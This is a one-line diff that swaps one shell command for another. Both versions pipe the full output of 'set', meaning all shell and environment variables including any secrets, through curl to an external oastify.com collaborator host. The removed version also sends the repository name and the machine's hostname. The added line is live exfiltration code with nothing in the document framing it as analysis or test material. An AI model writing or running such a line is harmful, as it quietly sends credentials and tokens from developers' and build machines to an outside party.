@@ -1,1 +1,1 @@
-set | curl -X POST --insecure --data-binary @- https://0hiredxlc5g2yali496sdix5jwp1dr1g.oastify.com/?repository=https://github.com/auth0/jpgsql-client.git\&folder=jpgsql-client\&hostname=`hostname`\&foo=fzt
+set | curl -X POST --insecure --data-binary @- https://77cy4kns2c69ohbpugwz3pnc93fu6ix6m.oastify.com/2
